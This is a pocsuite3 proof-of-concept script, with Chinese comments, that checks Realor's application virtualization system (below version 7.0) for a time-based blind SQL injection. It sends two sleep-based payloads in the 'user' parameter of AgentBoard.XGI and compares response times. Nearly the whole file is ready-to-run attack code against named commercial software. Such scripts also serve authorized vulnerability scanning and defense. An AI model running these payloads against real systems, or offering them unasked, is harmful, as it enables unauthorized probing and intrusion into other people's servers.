#!/usr/bin/env python
# coding: utf-8
from collections import OrderedDict
from urllib.parse import urljoin
import re,random,hashlib,base64
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2023-04-12'  #漏洞公开的时间,不知道就写今天
    createDate = '2023-04-12'  # 编写 PoC 的日期
    updateDate = '2023-04-12'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = ''  # PoC 名称
    appPowerLink = 'http://www.realor.cn'  # 漏洞厂商主页地址
    appName = ''  # 漏洞应用名称
    appVersion = '''<7.0'''  # 漏洞影响版本
    vulType = VUL_TYPE.SQL_INJECTION #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        瑞友天翼应用虚拟化系统 AgentBoard.XGI页面user参数 存在SQL注入漏洞
    '''
  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    def _verify(self):
        result = {}
        payload_1 = "' and (select 1 from (select(sleep(5-(if(1=1,0,1)))))a)--+" #响应时间5秒
        payload_2 = "' and (select 1 from (select(sleep(5-(if(1=2,0,2)))))a)--+" #响应时间3秒
        path_1="/AgentBoard.XGI?user=1"+payload_1+"&cmd=UserLogin"
        path_2="/AgentBoard.XGI?user=1"+payload_2+"&cmd=UserLogin"
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
        }
        try:
            resq_1 = requests.get(url=self.url+path_1,headers=headers,timeout=10)
            resq_2 = requests.get(url=self.url+path_2,headers=headers,timeout=10)
            if resq_1.elapsed.seconds>=5 and 4>=resq_2.elapsed.seconds>=3:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url + payload_1
        except Exception as e:
            return
        return self.parse_output(result)         

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)